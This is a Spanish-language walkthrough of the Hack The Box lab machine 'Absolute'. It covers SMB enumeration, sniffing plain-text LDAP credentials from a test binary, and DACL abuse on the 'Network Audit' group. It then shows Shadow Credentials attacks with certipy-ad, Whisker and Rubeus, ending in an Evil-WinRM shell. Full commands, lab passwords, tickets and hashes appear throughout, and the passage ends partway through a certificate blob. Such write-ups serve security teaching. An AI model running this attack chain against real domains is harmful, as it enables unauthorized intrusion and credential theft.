SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 

```

Anteriormente disponíamos de una carpeta compartida por SMB, a la cual no teníamos acceso, vamos a comprobar si ahora con el nuevo usuario comprometido podemos:

### Enumerando SMB Autenticado

```bash
❯ cme smb 10.129.68.75 -u 'svc_smb' -p 'AbsoluteSMBService123!' -k --shares
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
SMB         10.129.68.75    445    DC               [+] Enumerated shares
SMB         10.129.68.75    445    DC               Share           Permissions     Remark
SMB         10.129.68.75    445    DC               -----           -----------     ------
SMB         10.129.68.75    445    DC               ADMIN$                          Remote Admin
SMB         10.129.68.75    445    DC               C$                              Default share
SMB         10.129.68.75    445    DC               IPC$            READ            Remote IPC
SMB         10.129.68.75    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.68.75    445    DC               Shared          READ            
SMB         10.129.68.75    445    DC               SYSVOL          READ            Logon server share 
```
{: .nolineno }

El output de crackmapexec nos indica que disponemos de permisos de lectura para esa carpeta. Para conectarme como el usuario `smb_svc`, voy eliminar el ticket anterior y generar uno nuevo.

```
❯ kdestroy
❯ kinit svc_smb
Password for svc_smb@ABSOLUTE.HTB: 
```

No se porque por `smbclient` me daba fallos por todos lados usando kerberos. En estes caso use impacket. Es importante setear la variable de entorno `KRB55CNAME` al ticket anteriormente, ya que impacket por defecto busca el fichero `ccache` para usar Kerberos.

```bash
❯ KRB5CCNAME=/tmp/krb5cc_1000 impacket-smbclient 'absolute.htb/svc_smb@dc.absolute.htb' -k
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands
# 
```

Dentro del fichero vemos dos ficheros, voy a descargarlos para inspeccionarlos detenidamente.
{: .nolineno }
```
# use Shared
# ls
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 .
drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 ..
-rw-rw-rw-         72  Thu Sep  1 19:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Thu Sep  1 19:02:23 2022 test.exe
```
{: .nolineno }
```
# get test.exe
# get compiler.sh
```

### VPN: Routing

El fichero `compiler.sh` es un script para compilar un programa `nim`y `test.exe` es un ejecutable de Windows de 64 bits.

```bash
❯ file *
compiler.sh: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
test.exe:    PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows, 11 sections
```
{: .nolineno }

Voy a transferir el fichero a mi máquina Windows, para poder trastear más cómodamente.

Como atacante es de esperar que este binario este interactuando con el Domain Controller de alguna manera, pudiendo obtener credenciales en este proceso de comunicación. Lo que esta haciendo realmente es una consulta por LDAP al Domain Controller, y yo quiero capturarla con WireShark, y para esto es necesario tener conectividiad con la máquina víctima desde Windows

**Uso de VPNForwarding.sh**

Después de hacer varias máquinas en las que al final tenía que utilizar Windows y por ende tenía que cambiar la VPN de HTB o ejecutar las mismas reglas iptables una y otra vez, hice un pequeño script que automatizara todo el proceso.

El script es el siguiente  [VPNForwarding.sh](https://raw.githubusercontent.com/ace00k/automation-tools/main/VPNforwarding.sh). Su funcionamiento es sencillo: basta con ejecutarlo con privilegios de root en una máquina Linux y utilizar el comando resultante en la máquina Windows. De esta manera, mi máquina Kali actúa como enrutador, lo que me permite establecer conectividad con la máquina víctima desde mi Windows.

```bash
❯ sudo /opt/automation-tools/./VPNforwarding.sh
[sudo] password for alex: 

[+] Interface tun0 exists, skipping

[!] IPv4 forwarding is not enabled! Do you want to enable it? (y/n): y

[*] Enabling IPv4 forwarding

[+] Done!

[!] Are you sure you want to proceed? All currently saved iptables rules will be deleted. (y/n): 
y
[+] Iptables rules created, please run the following command on your Windows host:

	route add 10.129.0.0/16 192.168.1.44
```
{: .nolineno }

Pegamos el comando en la máquina Windows.

![img](/assets/img/post/Absolute/7.png)

Ahora si que tenemos conectividad con la máquina víctima. Podemos comprobarlo envíando una traza ICMP.

![img](/assets/img/post/Absolute/8.png)

Como nos estamos enfrentando a un controlador de dominio, voy a configurar la IP de Absolute como servidor DNS Esto se puede hacer de la siguiente forma:  (Win + R )  `ncpa.cpl`

![img](/assets/img/post/Absolute/9.png)

Seleccionamos la interfaz Ethernet0 y hacemos click derecho en propiedades.

![img](/assets/img/post/Absolute/11.png)

Nos vamos a `Protocolo de Internet versión 4`

![img](/assets/img/post/Absolute/12.png)

Y ponemos la IP de Absolute como servidor DNS preferido

![img](/assets/img/post/Absolute/13.png)

Si hacemos una petición DNS a `absolute.htb` vemos que nos resuelve correctamente.

![img](/assets/img/post/Absolute/14.png)

### Capturando Credenciales con Wireshark

Habiendo transferido el binario a la máquina Windows, voy a ejecutarlo para ver que hace.

![img](/assets/img/post/Absolute/6.png)

No veo ningún output ni ha ocurrido nada en especial cuando ejecuté el binario. Lo que voy a hacer, antes de hacerle reversing, es prender WireShark y voy a comprobar si cuando ejecute el binario existe tráfico saliente destinado a la dirección IP de Absolute. Ya que es común que esta clase de binarios customizados tengan que conectarse al DC, para realizar algún tipo de gestión pudiendo capturar credenciales en el proceso.

Cuando utilizamos Wireshark para capturar el tráfico en la interfaz `Ethernet0`, a menudo nos encontramos con una gran cantidad de datos que no son de interés.  Con el siguiente filtro vamos a capturar solamente los paquetes que contienen la dirección IP de Absolute y al mismo tiempo, quitamos las solicitudes DNS. El filtro que he utilizado es el siguiente

```
ip.addr == 10.129.68.75 && not udp.port ==53
```


![img](/assets/img/post/Absolute/2.png)

Vamos a volver a ejecutar `test.exe`

![img](/assets/img/post/Absolute/3.png)

En WireShark podemos ver el tráfico de red generado, en el que se encuentra las consultas LDAP.

![img](/assets/img/post/Absolute/4.png)

Si inspeccionamos los paquetes podemos ver las credenciales del usuario `m.lovegod`, en texto plano.

![img](/assets/img/post/Absolute/5.png)

## Acceso Inicial

Voy a explicar dos métodos diferentes para obtener acceso. Uno desde Windows y otro desde Linux. En Windows, utilizaremos  `PowerView`, `Rubeus` y `Whisker`, lo que resulta en un proceso más sencillo. En el caso de Linux, tendremos que realizar pasos adicionales, como descargar un script de Impacket llamado `dacledit`, que no se encuentra en la rama por defecto, y luego utilizar la herramienta `certipy-ad`.
### Enumerando el vector de ataque desde Bloodhound

Primero vamos a comprobar que las credenciales capturadas por Wireshark sean válidas dentro del dominio.

```bash
❯ cme smb 10.129.68.75 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k
SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.68.75    445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
```
{: .nolineno }

Siendo válidas marcamos al usuario `m.lovegod` como `onwed` dentro de bloodhound, nos movemos a la pestaña de `Node` y hacemos click en `Reachable High Valuable Targets`

![img](/assets/img/post/Absolute/22.png)

![img](/assets/img/post/Absolute/23.png)
El resultado de la query nos muestra un camino para convertirnos en el usuario `winrm_user`, el cual tiene la capacidad de crear una conexión remota en el equipo. 

![img](/assets/img/post/Absolute/24.png)

Si vemos los grupos a los que pertenece `winrm_user`, vemos que es miembro de `Remote Management Users`, lo cual quiere decir que con las credenciales de este usuario podemos conectarnos mediante el servicio de la administación remota de Windows (WinRM) al DC.

![img](/assets/img/post/Absolute/25.png)

Vamos por partes, primero vamos a hacer click en `Owns`, para ver que podemos hacer

![img](/assets/img/post/Absolute/26.png)

![img](/assets/img/post/Absolute/27.png)

Bloodhound nos dice, que el usuario `m.lovegod` es dueño del grupo `NetWork Audit`, lo cual quiere decir que como propietario, puede cambiar la configuración de seguridad del grupo, incluso si existen unos permisoos establecidos por DACLs. Es decir podemos hacer lo que queramos con este grupo. 

Seguidamente vemos que los miembros de `Network Audit` poseen un `GenericWrite` sobre el usuario `winrm_user`

![img](/assets/img/post/Absolute/28.png)

![img](/assets/img/post/Absolute/29.png)

Esto quiere decir que podemos escribir atribustos específicos del usuario `winrm_user` como miembros de este grupo, pudiendo crear SPNs, es decir hacer el usuario Kerberoesteable y luego con impacket o rubeus obtener el ticket del usuario con su contraseña cifrada. En este caso si nos vamos la pestaña `Linux Abuse` , vemos un ataque extra que es el **Shadow Credentials Attack**

![img](/assets/img/post/Absolute/30.png)

Con este ataque es posible añadir Key Credentials al atributo `msDS-KeyCredentialLink` del objeto usuario/ordenador de destino y luego realizar la autenticación Kerberos como esa cuenta utilizando `PKINIT`. 

(Explicar lo del PKINIT)

En este enlace se explica como realizar este ataque, y las condiciones necesarias que se deben de tener para que funcione:  
[Shadow Credentials Attack](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)

### Añadiendo a m.lovegood a Network Audit

Como mencionamos anteriormente, el usuario `mv.lovegod` tiene permisos `FullControl` sobre el grupo `Network Audit`. Por lo tanto, nuestra estrategia implica modificar la DACL para poder agregarlo a dicho grupo.
#### Método 1: Desde Linux

Nos clonamos la rama de `dacledit` en nuestro sistema.

```bash
❯ git clone https://github.com/ShutdownRepo/impacket -b dacledit
Cloning into 'impacket'...
remote: Enumerating objects: 24084, done.
remote: Counting objects: 100% (5485/5485), done.
remote: Compressing objects: 100% (298/298), done.
remote: Total 24084 (delta 5246), reused 5187 (delta 5187), pack-reused 18599
Receiving objects: 100% (24084/24084), 9.82 MiB | 6.68 MiB/s, done.
Resolving deltas: 100% (18353/18353), done.
```
{: .nolineno }

Para no causar confictos con mi versión de impacket, creare un entorno virtual con python

```bash
❯ python3 -m venv .venv
❯ source .venv/bin/activate
```
{: .nolineno }

Instalamos impacket en el entorno

```bash
❯ pip3 install .
Processing /home/alex/HTB/Absolute/content/impacket
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting pyasn1>=0.2.3 (from impacket==0.9.25.dev1+20230823.145202.4518279)
  Downloading pyasn1-0.5.0-py2.py3-none-any.whl (83 kB)
```
{: .nolineno }

Después de completar estos pasos, ejecutamos el script `dacledity.py`, especificando la variable de entorno `KRB5CCNAME` para que apunte al ticket que generamos previamente. Esto se debe a que, por defecto, Impacket busca un archivo .ccache para la autenticación y en este caso lo hemos generado con kinit.

```bash
❯ KRB5CCNAME=/tmp/krb5cc_1000 ./dacledit.py -k -no-pass -dc-ip 10.129.68.75 -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod
Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20231106-192332.bak
[*] DACL modified successfully!
```
{: .nolineno }

Ahora vamos a añadir el usuario al grupo con `net rpc`.

```bash
❯ net rpc group addmem "Network Audit" -U m.lovegod -S dc.absolute.htb -k m.lovegod
```
{: .nolineno }

No vemos ningún output. Podemos comprobar que el usuario se ha añadido correctamente con la opción `members` de `net rpc`

```bash
❯ net rpc group members "Network Audit" -U m.lovegod -S dc.absolute.htb --use-kerberos=required
Password for [WORKGROUP\m.lovegod]:
absolute\m.lovegod
absolute\svc_audit
```
#### Método 2: Desde Windows

El proceso anterior es mucho más sencillo desde una máquina Windows. El primer paso será generar una sesión para el usuario `m.lovegod`, como la autenticación NTLM está desactivada, lo haré mediante Kerberos. Para ello haré uso de `Rubeus.exe`

```
PS C:\users\alex\desktop\HTB> C:\tools\Rubeus.exe asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /domain:absolute.htb /ptt /enctype:aes256

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
[*] Building AS-REQ (w/ preauth) for: 'absolute.htb\m.lovegod'
[*] Using domain controller: 10.129.229.59:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      bHV0ZS5odGI=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  m.lovegod
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  07/11/2023 18:17:04
  EndTime                  :  07/11/2023 22:17:04
  RenewTill                :  07/11/2023 22:17:04
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  A6io03SBq6jyfBE1PzZB8a5V02ZRhPIXsYVYiNvDnqA=
  ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554

PS C:\users\alex\desktop\HTB>
```

LIstamos los tickets y vemos que se ha importado correctamente.

```
PS C:\users\alex\desktop\HTB> klist

El id. de inicio de sesión actual es 0:0x25e7d

Vales almacenados en caché: (2)

#0>     Cliente: m.lovegod @ ABSOLUTE.HTB
        Servidor: krbtgt/absolute.htb @ ABSOLUTE.HTB
        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
        Marcas de vale 0xe10000 -> renewable initial pre_authent name_canonicalize
        Hora de inicio: 11/7/2023 18:17:04 (local)
        Hora de finalización:   11/7/2023 22:17:04 (local)
        Hora de renovación: 11/7/2023 22:17:04 (local)
        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
        Marcas de caché: 0x1 -> PRIMARY
        KDC llamado:

#1>     Cliente: m.lovegod @ ABSOLUTE.HTB
        Servidor: cifs/dc.absolute.htb @ ABSOLUTE.HTB
        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
        Marcas de vale 0xa50000 -> renewable pre_authent ok_as_delegate name_canonicalize
        Hora de inicio: 11/7/2023 18:17:58 (local)
        Hora de finalización:   11/7/2023 22:17:04 (local)
        Hora de renovación: 11/7/2023 22:17:04 (local)
        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
        Marcas de caché: 0
        KDC llamado: dc.absolute.htb
```

Podemos comprobarlo listando los recursos compartidos del DC.

```
PS C:\users\alex\desktop\HTB> dir \\dc.absolute.htb\shared


    Directorio: \\dc.absolute.htb\shared


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        08/06/2022     15:22             72 compiler.sh
-a----        08/06/2022     19:29          67584 test.exe

```

Bien para llevar a cabo este ataque según explica bloodhound, es necesario tener importado Powerview

```
PS C:\users\alex\desktop\HTB> Import-Module \tools\PowerView.ps1
```

Una vez echo esto vamos a añadirnos al grupo `Network Audit` con el siguente comando. En este caso el parámetro `-Credential` no es necesario de usar, ya que disponemos un ticket de kerberos perteneciente al usuario `m.lovegod`, por lo que no hace falta crear ningún objeto `PSCredential`.

```
PS C:\users\alex\desktop\HTB> Add-DomainObjectAcl -TargetIdentity "Network Audit" -Rights All -PrincipalIdentity m.lovegod -DomainController dc.absolute.htb
```

Disponiendo de todos los permisos sobre el grupo, voy a añadir el usuario `m.lovegod` al grupo `Network Audit`

```
PS C:\Users\Alex> Add-DomainGroupMember -Identity "Network Audit" -Member m.lovegod -Domain "absolute.htb"
```

![img](/assets/img/post/Absolute/17.png)

Si vemos los miembros del grupo `Network Audit` vemos que `m.lovegod` se ha añadido correctamente.

![img](/assets/img/post/Absolute/31.png)

### Shadow Credentials Attack

#### Desde Linux: Certipy-AD

Este ataque se puede realiza usando `pyWhisker` o `certipy-ad`. En este caso lo voy a hacer con certipy, ya que el proceso es mucho más sencillo.

Con el siguiente comando automatizamos todo el proceso, obtiendo como resultado el hash del usuario `winrm_user` y el TGT, en formato ccache.

```bash
❯ KRB5CCNAME=/tmp/krb5cc_1000 certipy-ad shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7bd93d9f-929e-6f28-ccea-c147fe59cf42'
[*] Adding Key Credential with device ID '7bd93d9f-929e-6f28-ccea-c147fe59cf42' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID '7bd93d9f-929e-6f28-ccea-c147fe59cf42' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Using principal: winrm_user@absolute.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```

Como hemos visto antes, la autenticación NTLM está desactivada, por lo que el hash solo sirve para intentar crackearlo y obtener la contraseña en texto plano., cosa que no he conseguido. En este caso usamos el TGT `.ccache`, para conectarnos por WinRM al DC.

```
❯ ls *.ccache
winrm_user.ccache
```

Usaré `Evil-WinRM`. Para conectarnos usando Kerberos debemos indicar como variable de entorno, el fichero `.ccache` perteneciente al usuario, e indicar el `realm`, es decir el nombre del dominio. También es importante indicar en lugar de la IP, el FQDN del DC, ya que Kerberos es especialillo y no le suelen gustar las IPs.

```bash
❯ KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb -u winrm_user
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
absolute\winrm_user
*Evil-WinRM* PS C:\Users\winrm_user\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 3:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::19c
   IPv6 Address. . . . . . . . . . . : dead:beef::7dc9:28ca:b147:9c36
   Link-local IPv6 Address . . . . . : fe80::7dc9:28ca:b147:9c36%11
   IPv4 Address. . . . . . . . . . . : 10.129.68.75
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
                                       10.129.0.1
```
{: .nolineno }

#### Desde Windows: Whisker

Bien este mismo ataque lo podemos hacer desde Windows con [Whisker](https://github.com/eladshamir/Whisker). Nos clonamos el repositorio y lo compilamos desde **Visual Studio Code**.

![img](/assets/img/post/Absolute/32.png)

Antes de continuar. Existe una tarea programada en la máquina que hace, que cada ciertos minutos se borre la DACL, que anteriormente hemos modifcado. Por lo que nuestro usuario será eliminado del grupo `New Audit` y no podremos realizar este ataque con éxito. Así que cada cierto tiempo hay que volver a ejecutar los comandos anteriores para añadir el usuario al grupo mientras realizamos el ataque. Otra cosa importante es que cuando nosotros añadimos el usuario al grupo, el ticket, del que disponemos no guarda esa información o almenos es mi conclusión por que el ataque no funcionaba. Mi consejo es que regenereis el ticket una vez hayais añadido el usuario al grupo. Esto se hace de la siguente manera:

```
klist purge
C:\tools\Rubeus.exe asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /domain:absolute.htb /ptt /enctype:aes128
```

Bien con el ticket bueno en memoria vamos a realizar el ataque

```
PS C:\Users\Alex> C:\tools\Whisker.exe add /domain:absolute.htb /target:winrm_user /user:m.lovegod /dc:dc.absolute.htb
```

![img](/assets/img/post/Absolute/33.png)

El output de **Whisker** nos dice que ejecutemos el siguiente comando con **Rubeus** para obtener el hash NTLM y TGT del usuario `winrm_user`. 

Al comando que indica Whisker, le voy a añadir el parámetro `/ptt`, para inyectar el ticket en memoria. Obtenemos el hash NTLM del usuario sí, pero si recordamos bien, la autenticación esta configurada para que solamente funcione por Kerberos y un Pass-The-Hash no va a funcionar. Aun así podríamos intentar crackear el hash NTLM , y descubrir la contraseña, en este caso no pude romper el hash.  

```
PS C:\Users\Alex> C:\tools\Rubeus.exe asktgt /user:winrm_user /certificate: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